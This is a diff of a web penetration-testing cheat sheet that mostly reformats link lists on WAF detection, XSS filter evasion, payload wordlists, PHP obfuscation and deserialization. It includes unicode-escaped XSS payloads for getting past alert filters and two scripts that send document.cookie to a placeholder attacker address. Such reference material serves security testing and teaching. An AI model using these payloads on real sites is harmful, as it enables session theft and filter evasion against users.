@@ -25,7 +25,7 @@ https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html
 -> imperva-detect  
 https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh
 
--> bypass to find real ip in CloudFlare:  
+-> bypass to find real ip in CloudFlare  
 https://github.com/zidansec/CloudPeler
 
 #### Others
@@ -80,8 +80,6 @@ https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/2
 
 ### PHP Obfuscation - base64+gzdeflate
 
-codes/obufscation/obfuscation.php
-
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php
 
 ## Online PHP Executor
@@ -102,30 +100,22 @@ https://hackvertor.co.uk/public
 
 -> XSS Auditor and XSS Filter
 
-https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md
-
-https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
-https://www.chromium.org/developers/design-documents/xss-auditor/
-
-https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge
-
+https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
+https://www.chromium.org/developers/design-documents/xss-auditor/  
+https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge  
 https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection
 
 -> Wordlists for XSS Bypass
 
-https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst
-
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt
-
-https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt
-
+https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst  
+https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt  
+https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt  
 https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt
 
 ### XSS Keylogger
 
-https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/
-
+https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/  
 https://github.com/hadynz/xss-keylogger
 
 ### XSS Mutation
@@ -165,13 +155,13 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
  
 #### blocked - alert - bypass
   
--> `<script>\u0061lert(1)</script>`
+`<script>\u0061lert(1)</script>`
   
--> `<script>\u0061\u006C\u0065\u0072\u0074(1)</script>`
+`<script>\u0061\u006C\u0065\u0072\u0074(1)</script>`
   
--> `<script>eval("\u0061lert(1)")</script>`
+`<script>eval("\u0061lert(1)")</script>`
   
--> `<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>`
+`<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>`
   
 #### Removing HTML Tags
   
@@ -258,9 +248,8 @@ https://malwaredecoder.com/
   
 ex:
   
-\<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>
-
-\<script>window.location="http://ip:port/?cookie="+document.cookie;</script>
+`<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>`
+`<script>window.location="http://ip:port/?cookie="+document.cookie;</script>`
 
 ## Type Juggling
 
@@ -269,15 +258,14 @@ https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
 ### PHP - others tricks
 
 [ eval () execute a chain whose variable $ HTTP_USER_AGENT is so just
-change your header in PHP code ]
-
+change your header in PHP code ]  
 https://www.exploit-db.com/papers/13694
 
 ## Insecure Deserialization 
 
 -> Binary
 
--> Human-readable
+-> Human-Readable
 
 ### PHP Deserialization
 
@@ -293,7 +281,7 @@ https://www.exploit-db.com/papers/13694
 
 -> __destruct()
 
--> __wakUp()
+-> __wakeup()
 
 #### Class Properties
 
